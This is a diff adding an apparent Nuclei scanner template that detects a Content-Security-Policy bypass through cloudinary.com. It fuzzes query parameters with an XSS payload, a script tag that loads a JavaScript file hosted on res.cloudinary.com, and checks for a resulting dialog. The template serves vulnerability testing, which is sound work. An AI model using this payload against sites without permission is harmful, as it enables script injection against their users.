@@ -1,0 +1,52 @@
+id: cloudinary-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - cloudinary
+  author: pussycat0x
+  severity: medium
+  metadata:
+    verified: false
+  tags: xss,csp-bypass,cloudinary,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "cloudinary.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: cloudinary_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src=https://res.cloudinary.com/dw1fa6csl/raw/upload/v1664828137/samples/test/alert-one_ryg8ba.js></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "cloudinary_csp_xss == true"
